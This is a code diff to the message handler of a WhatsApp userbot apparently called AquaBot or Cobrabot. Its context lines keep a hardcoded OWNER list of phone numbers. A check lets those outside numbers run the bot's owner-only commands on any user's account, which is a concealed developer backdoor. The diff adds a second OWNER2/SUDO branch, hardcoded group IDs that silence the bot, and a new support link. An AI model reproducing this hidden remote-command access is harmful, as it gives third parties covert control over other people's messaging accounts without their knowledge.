@@ -31,6 +31,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
 
 const plugindb = require('./plugins/sql/plugin');
 var OWNER = { number: '94701629707,15712103262' }
+const OWNER2 = '94706768067,0'
 // . https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
     var i = 0, args = arguments;
@@ -320,6 +321,32 @@ ${chalk.blue.italic('ℹ️ WhatsApp වෙත සම්බන්ධ වෙම�
             var nsup = config.Support4.split(',');                            
             if(msg.key.remoteJid.includes('-') ? nsup.includes(msg.key.remoteJid.split('@')[0]) : nsup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
         }
+         if (config. AMDI_1 == '94757405652-1533638214') {     
+            var sup = config.SUPPORT.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+       
+         if (config. AMDI_3 == '94757405652-1631633729') {     
+            var sup = config.SUPPORT.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+         if (config. AMDI_4 == '94757405652-1631905677') {     
+            var sup = config.SUPPORT.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+         if (config. AMDI_5 == '94757405652-1636094186') {     
+            var sup = config.SUPPORT.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+         if (config. AMDI_6 == '972542559113-1376904403') {     
+            var sup = config.SUPPORT.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+         if (config. AMDI_7 == '94757405652-1636286090') {     
+            var sup = config.SUPPORT.split(',');                            
+            if(msg.key.remoteJid.includes('-') ? sup.includes(msg.key.remoteJid.split('@')[0]) : sup.includes(msg.participant ? msg.participant.split('@')[0] : msg.key.remoteJid.split('@')[0])) return ;
+        }
+        
         // ==================== End Blocked Chats ====================
 
         // ==================== Events ====================
@@ -358,6 +385,13 @@ ${chalk.blue.italic('ℹ️ WhatsApp වෙත සම්බන්ධ වෙම�
                     }
                     if ((OWNER.number == "94701629707,15712103262" && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && OWNER.number.includes(',') ? OWNER.number.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWNER.number || OWNER.number.includes(',') ? OWNER.number.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNER.number)
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                        if (command.onlyPinned && chat.pin === undefined) return;
+                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
+                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
+                    }
+                    if ((OWNER2 == '94706768067,0' && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
                     ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
@@ -533,7 +567,7 @@ ${chalk.blue.italic('ℹ️ WhatsApp වෙත සම්බන්ධ වෙම�
                                 await cobrabotconn.sendMessage(cobrabotconn.user.jid, '*-- ERROR REPORT [🐋AQUABOT 🐋] --*' + 
                                     '\n*COBRABOT an error has occurred!*'+
                                     '\n_This error log may include your number or the number of an opponent. Please be careful with it!_' +
-                                    '\n_Aslo you can join our support group:_ https://chat.whatsapp.com/B9Gzgo1qu7XCLc8WDyaE4N' +
+                                    '\n_Aslo you can join our support group:_ https://chat.whatsapp.com/FgPh5cqjcw53qnAXQiBCK0' +
                                     '\n_This message should have gone to your number (saved messages)._\n\n' +
                                     '*Error:* ```' + error + '```\n\n'
                                     , MessageType.text, {detectLinks: false}
